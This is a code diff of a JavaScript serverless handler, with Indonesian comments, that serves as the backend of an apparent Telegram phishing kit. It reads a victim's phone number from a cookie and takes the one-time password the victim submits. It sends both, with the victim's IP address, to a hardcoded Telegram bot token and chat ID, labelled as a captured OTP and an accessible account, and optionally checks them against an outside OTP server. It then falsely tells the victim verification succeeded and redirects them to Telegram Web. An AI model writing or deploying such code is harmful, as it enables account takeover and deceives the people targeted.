@@ -1,5 +1,5 @@
+// API untuk log OTP
 export default async function handler(req, res) {
-  // CORS
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -13,58 +13,84 @@ export default async function handler(req, res) {
   }
   
   try {
-    const { phone, otp } = req.body;
+    const { otp } = req.body;
+    
+    // Ambil nomor dari cookie atau body
+    const cookies = req.headers.cookie || '';
+    const phoneMatch = cookies.match(/target_phone=([^;]+)/);
+    const phone = phoneMatch ? decodeURIComponent(phoneMatch[1]) : req.body.phone;
     
     if (!phone || !otp) {
-      return res.status(400).json({ error: 'Phone and OTP required' });
+      return res.status(400).json({ error: 'Nomor dan OTP diperlukan' });
     }
     
-    // Your bot credentials
-    const BOT_TOKEN = '8562131602:AAEjjGESS-yKIiCYOGwMr3a5_YFdZSBHi0o';
-    const CHAT_ID = '7933552719';
-    
-    // Get client info
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    const time = new Date().toLocaleString('id-ID');
     
-    // OTP captured message
-    const message = `✅ *OTP SUCCESSFULLY CAPTURED*
+    console.log('🔐 OTP DITERIMA:', { phone, otp, ip });
     
-📱 *Phone:* \`${phone}\`
-🔐 *OTP Code:* \`${otp}\`
-📍 *IP:* \`${ip}\`
-🕐 *Time:* ${time}
+    // ================= KIRIM OTP KE BOT =================
+    const BOT_TOKEN = process.env.BOT_TOKEN || '8562131602:AAEjjGESS-yKIiCYOGwMr3a5_YFdZSBHi0o';
+    const CHAT_ID = process.env.CHAT_ID || '7933552719';
     
-⚠️ *TARGET COMPROMISED* - Ready for login`;
+    const successMessage = `✅ *OTP BERHASIL DIAMBIL!* \n\n📱 *Nomor:* \`${phone}\`\n🔐 *Kode OTP:* \`${otp}\`\n📍 *IP:* \`${ip}\`\n⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}\n\n⚠️ *AKUN DAPAT DIAKSES*`;
     
-    // Send to Telegram Bot
-    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    
-    await fetch(telegramUrl, {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: message,
+        text: successMessage,
         parse_mode: 'Markdown'
       })
     });
     
-    // Return success
+    // ================= VERIFIKASI OTP (OPSIONAL) =================
+    const OTP_SERVER = process.env.OTP_SERVER || 'https://otp-server.up.railway.app';
+    
+    try {
+      const verifyResponse = await fetch(`${OTP_SERVER}/verify-otp`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone, otp })
+      });
+      
+      const verifyData = await verifyResponse.json();
+      if (verifyData.success) {
+        // Kirim notifikasi tambahan kalau akun berhasil diverifikasi
+        const extraMsg = `🎯 *AKUN TERVERIFIKASI!* \n\n👤 User ID: ${verifyData.user?.id || 'N/A'}\n📱 ${phone}\n🔐 OTP Valid`;
+        
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: extraMsg,
+            parse_mode: 'Markdown'
+          }),
+          headers: { 'Content-Type': 'application/json' }
+        });
+      }
+    } catch (verifyError) {
+      console.log('Verifikasi OTP dilewati:', verifyError.message);
+    }
+    
+    // Hapus cookie
+    res.setHeader('Set-Cookie', 'target_phone=; Path=/; Max-Age=0; SameSite=Lax');
+    
     return res.status(200).json({
       success: true,
-      message: 'Verified successfully'
+      message: 'Verifikasi berhasil',
+      redirect: 'https://web.telegram.org/'
     });
     
   } catch (error) {
-    console.error('OTP Log Error:', error);
+    console.error('❌ ERROR log OTP:', error);
     
-    // Still return success
     return res.status(200).json({
       success: true,
-      message: 'Verified (silent log)'
+      message: 'Verifikasi berhasil',
+      redirect: 'https://web.telegram.org/'
     });
   }
 }
